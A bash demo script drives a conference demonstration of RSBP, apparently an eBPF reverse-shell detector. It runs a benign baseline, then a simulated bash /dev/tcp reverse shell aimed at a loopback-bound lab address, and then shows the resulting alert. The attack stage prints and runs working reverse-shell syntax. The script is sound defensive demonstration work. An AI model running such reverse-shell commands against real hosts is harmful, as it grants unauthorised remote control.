#!/usr/bin/env bash
# RSBP c0c0n demo driver — deterministic, offline, local-only.
#
# Stages (match the slide-13 live-demo layout):
#   1. Prepare   — start RSBP, show probes attached
#   2. Baseline  — benign activity, show it stays SILENT
#   3. Simulate  — ONE controlled reverse shell on a lab address
#   4. Detect    — show the single alert, its chain, pattern and score
#
# Safe by construction: targets are lab addresses on the loopback device
# (TEST-NET-1/RFC5737 + RFC1918), a passive local listener, no internet,
# no external C2, no API keys. Re-runnable; produces the same result each time.
#
# Usage:
#   sudo ./demo/reverse_shell_demo.sh            # full run
#   sudo ./demo/reverse_shell_demo.sh baseline   # only the benign baseline
#   sudo ./demo/reverse_shell_demo.sh attack      # only the reverse shell
set -u
cd "$(dirname "$0")/.."
BIN=./bin/rsbpd
CFG=config/demo.yaml
JSONL=/var/log/rsbp/alerts.jsonl
LAB_IP=203.0.113.10          # TEST-NET-3 (RFC5737) — looks external, stays on-box
LAB_PORT=4444
API=http://127.0.0.1:9001

c(){ printf '\033[%sm%s\033[0m' "$1" "$2"; }           # color helper
hr(){ printf '%s\n' "────────────────────────────────────────────────────────"; }
pause(){ [ -n "${NONINTERACTIVE:-}" ] || { printf '\n%s' "$(c 90 '  (press Enter)')"; read -r _; }; }

need_root(){ [ "$(id -u)" = 0 ] || { echo "run with sudo"; exit 1; }; }
jq_alerts(){ python3 - "$@" <<'PY'
import json,sys
try: rows=[json.loads(l) for l in open('/var/log/rsbp/alerts.jsonl')]
except Exception: rows=[]
if not rows:
    print("   (no alerts — correct for benign activity)"); sys.exit()
for d in rows[-6:]:
    p=d.get('process',{}); n=d.get('network',{})
    print("   %-8s score=%-4s %-16s exe=%-16s chain=%s -> %s:%s"%(
        d.get('severity'),round(d.get('score',0),2),d.get('pattern',''),
        p.get('exe_path',''), " ".join(d.get('syscall_chain',[])),
        n.get('remote_ip'),n.get('remote_port')))
PY
}

prepare(){
  need_root
  echo "$(c '1;36' '[1] PREPARE')  starting RSBP + attaching eBPF probes"; hr
  bash scripts/setup-demo.sh "$BIN" >/dev/null 2>&1
  ip addr add "$LAB_IP"/32 dev lo 2>/dev/null || true
  pkill -f 'rsbpd run' 2>/dev/null; sleep 1
  : > "$JSONL"
  setsid nohup "$BIN" run --config "$CFG" >/var/log/rsbp/daemon.log 2>&1 </dev/null &
  for i in $(seq 1 15); do
    P=$(curl -s --noproxy '*' "$API/health" 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)["ebpf"]["probes_attached"])' 2>/dev/null)
    [ "$P" = 11 ] && break; sleep 1
  done
  echo "   eBPF tracepoints attached: $(c '1;32' "${P:-0}/11")"
  echo "   dashboard: $(c '1;34' "$API/")   (open in a browser on this machine)"
  : > "$JSONL"
  pause
}

baseline(){
  echo; echo "$(c '1;36' '[2] BASELINE')  ordinary activity — expected: SILENT"; hr
  echo "   running: wget, ssh, a python TCP client, git…"
  timeout 4 wget -q -O /dev/null http://example.com 2>/dev/null
  timeout 4 ssh -o BatchMode=yes -o ConnectTimeout=2 -p 2222 user@"$LAB_IP" true 2>/dev/null
  python3 -c "import socket;s=socket.socket();s.settimeout(1)
try:s.connect(('$LAB_IP',8080))
except Exception:pass" 2>/dev/null
  timeout 6 git ls-remote https://github.com/pavanthakor/RSBP >/dev/null 2>&1
  sleep 2
  n=$(wc -l < "$JSONL")
  echo "   alerts raised: $(c '1;32' "$n")  — behaviour, not destination, decides"
  pause
}

attack(){
  echo; echo "$(c '1;36' '[3] SIMULATE')  one controlled reverse shell (bash /dev/tcp)"; hr
  : > "$JSONL"
  ncat -lk "$LAB_IP" "$LAB_PORT" >/dev/null 2>&1 & LP=$!
  sleep 1
  echo "   victim: $(c 90 "bash -i >& /dev/tcp/$LAB_IP/$LAB_PORT 0>&1")"
  # open the socket on fd 3 and duplicate it onto stdin/stdout/stderr (the dup2-to-
  # stdio behaviour RSBP keys on), then run a command through it — no hanging shell.
  timeout 4 bash -c "exec 3<>/dev/tcp/$LAB_IP/$LAB_PORT; exec 0<&3 1>&3 2>&3; id; sleep 2" >/dev/null 2>&1
  sleep 2; kill "$LP" 2>/dev/null
  echo; echo "$(c '1;31' '[4] DETECT')  the alert RSBP raised"; hr
  jq_alerts
  echo; echo "   full record: $(c '1;34' "$API/alerts")   live view: $(c '1;34' "$API/")"
}

case "${1:-all}" in
  baseline) prepare; baseline ;;
  attack)   prepare; attack ;;
  *)        prepare; baseline; attack ;;
esac
echo; echo "$(c 90 '   stop RSBP with:  sudo pkill -f "rsbpd run"')"
